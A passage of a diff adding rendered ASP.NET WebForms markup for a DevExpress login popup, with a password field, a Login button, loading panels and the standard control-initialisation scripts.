+	'decorationStyles':[
+		{'key':'F','className':'dxeFocused_Moderno','cssText':''},
+		{'key':'N','className':'dxeNullText_Moderno','cssText':''}
+	]
+});
+dxo.AfterCreate();
+
+//-->
+</script>
+                                                                 </td>
+                                                             </tr>
+                                                             <tr>
+                                                                 <td align="center" style="padding: 11px">
+                                                                     <table class="dxeTextBoxSys dxeTextBox_Moderno dxeTextBoxDefaultWidthSys" id="ASPxPopupControl1_passpop" style="width:90%;">
+						<tr>
+							<td class="dxic" style="width:100%;"><input class="dxeEditArea_Moderno dxeEditAreaSys" id="ASPxPopupControl1_passpop_I" name="ASPxPopupControl1$passpop" onfocus="ASPx.EGotFocus(&#39;ASPxPopupControl1_passpop&#39;)" onblur="ASPx.ELostFocus(&#39;ASPxPopupControl1_passpop&#39;)" onchange="ASPx.EValueChanged(&#39;ASPxPopupControl1_passpop&#39;)" type="password" /></td>
+						</tr>
+					</table><script id="dxss_1822290852" type="text/javascript">
+<!--
+ASPx.AddDisabledItems('ASPxPopupControl1_passpop',[[['dxeDisabled_Moderno'],[''],['','I']]]);
+
+var dxo = new ASPxClientTextBox('ASPxPopupControl1_passpop');
+dxo.InitGlobalVariable('ASPxPopupControl1_passpop');
+dxo.SetProperties({
+	'uniqueID':'ASPxPopupControl1$passpop',
+	'stateObject':{'rawValue':''},
+	'nullText':'Password'
+});
+dxo.InitializeProperties({
+	'decorationStyles':[
+		{'key':'F','className':'dxeFocused_Moderno','cssText':''},
+		{'key':'N','className':'dxeNullText_Moderno','cssText':''}
+	]
+});
+dxo.AfterCreate();
+
+//-->
+</script>
+                                                                 </td>
+                                                             </tr>
+                                                             <tr>
+                                                                 <td align="center" style="padding: 11px">
+                                                                     <div class="dxbButton_iOS dxbButtonSys dxbTSys" id="ASPxPopupControl1_ASPxButton6" style="font-size:Medium;font-weight:bold;width:90%;-webkit-user-select:none;">
+						<div class="dxb">
+							<div class="dxb-hbc">
+								<input id="ASPxPopupControl1_ASPxButton6_I" class="dxb-hb" value="Login" type="button" name="ASPxPopupControl1$ASPxButton6" />
+							</div><span class="dx-vam">Login</span>
+						</div>
+					</div><script id="dxss_2083951243" type="text/javascript">
+<!--
+ASPx.AddHoverItems('ASPxPopupControl1_ASPxButton6',[[['dxbButtonHover_iOS'],[''],[''],['','TC']]]);
+ASPx.AddPressedItems('ASPxPopupControl1_ASPxButton6',[[['dxbButtonPressed_iOS'],[''],[''],['','TC']]]);
+ASPx.AddDisabledItems('ASPxPopupControl1_ASPxButton6',[[['dxbDisabled_iOS'],[''],[''],['','TC']]]);
+ASPx.AddSelectedItems('ASPxPopupControl1_ASPxButton6',[[['dxbf'],[''],['CD']]]);
+
+var dxo = new ASPxClientButton('ASPxPopupControl1_ASPxButton6');
+dxo.InitGlobalVariable('ASPxPopupControl1_ASPxButton6');
+dxo.SetProperties({
+	'uniqueID':'ASPxPopupControl1$ASPxButton6',
+	'serverEvents':['Click']
+});
+dxo.SetEvents({
+	'Click':function(s, e) {
+}
+});
+dxo.AfterCreate();
+
+//-->
+</script>
+                                                                 </td>
+                                                             </tr>
+                                                             <tr>
+                                                                 <td align="center" style="padding: 11px">
+                                                                     &nbsp;</td>
+                                                             </tr>
+                                                         </table>
+
+				</div>
+			</div>
+		</div>
+	</div><div id="ASPxPopupControl1_DXPWMB-1" class="dxpcModalBackLite_Office2010Black" style="z-index:9999;">
+
+	</div><table id="ASPxPopupControl1_LP" class="dxpcLoadingPanel_Office2010Black dxlpLoadingPanel_Office2010Black" style="left:0px;top:0px;z-index:30000;display:none;">
+		<tr>
+			<td class="dx" style="padding-right:0px;"><img class="dxlp-loadingImage dxlp-imgPosLeft" src="/DXR.axd?r=1_35-_rgIn" alt="" style="margin-right:5px;vertical-align:middle;" /></td><td class="dx" style="padding-left:0px;"><span id="ASPxPopupControl1_TL">Loading&hellip;</span></td>
+		</tr>
+	</table><div id="ASPxPopupControl1_LD" class="dxpcLoadingDiv_Office2010Black dxlpLoadingDiv_Office2010Black dx-ft" style="left:0px;top:0px;z-index:29999;display:none;position:absolute;">
+
+	</div><script id="dxss_740945692" type="text/javascript">
+<!--
+
+var dxo = new ASPxClientPopupControl('ASPxPopupControl1');
+dxo.InitGlobalVariable('ttttttt');
+dxo.SetProperties({
+	'callBack':function(arg) { WebForm_DoCallback('ASPxPopupControl1',arg,ASPx.Callback,'ASPxPopupControl1',ASPx.CallbackError,true); },
+	'popupAnimationType':'fade',
+	'popupHorizontalAlign':'WindowCenter',
+	'popupVerticalAlign':'WindowCenter',
+	'isPopupPositionCorrectionOn':false,
+	'width':350,
+	'widthFromServer':true
+});
+dxo.AfterCreate();
+
+//-->
+</script>
+                                     </td>
+                             </tr>
+                         </table>
+
+</div>
+                      </td>
+
+        </tr>
+    </table>
+    <table class="auto-style1">
+        <tr>
+            <td align="center">
+               <table class="dxlpLoadingPanel_Moderno dxlpControl_Moderno" id="lp" style="position:absolute;left:0px;top:0px;z-index:30000;display:none;">
+	<tr>
+		<td class="dx" style="padding-right:0px;"><img class="dxlp-loadingImage dxlp-imgPosLeft" src="/DXR.axd?r=1_35-_rgIn" alt="" style="vertical-align:middle;" /></td><td class="dx" style="padding-left:0px;"><span id="lp_TL">Loading&hellip;</span></td>
+	</tr>
+</table><div id="lp_LD" class="dxlpLoadingDiv_Moderno dxlpControl_Moderno dx-ft" style="left:0px;top:0px;z-index:29999;display:none;position:absolute;">
+
+</div><script id="dxss_1169118695" type="text/javascript">
+<!--
+
+var dxo = new ASPxClientLoadingPanel('lp');
+dxo.InitGlobalVariable('lp');
+dxo.AfterCreate();
+
+//-->
+</script>
+     <script type="text/javascript">
+         document.getElementById("ddd2").style.visibility = "hidden";
+    </script>
+    <script id="dxss_1047512882" type="text/javascript">
+<!--
+var dxo = ASPx.GetGlobalEvents();
+dxo.SetEvents({
+	'ControlsInitialized':OnControlsInitialized
+});
+
+//-->
+</script>
+
+                &nbsp;<br />
+
+            </td>
+        </tr>
+    </table>
+
+
+<script type="text/javascript">
+//<![CDATA[
+
+var callBackFrameUrl='/WebResource.axd?d=Sehdtmv9xDZ361kge1SGKfKApT03tf-IfQAqS-x-CLu5aaLCsTZpbBgX7hfNCqcWIJx0KH0yO7ZTYFxzRVM41CuxOoM2TgrkoI-cz3TJfeE1&t=637453854340000000';
+Web_InitCallback();//]]>
+</script>
+
+
+
+
+</form>
+    </body>
+</html>
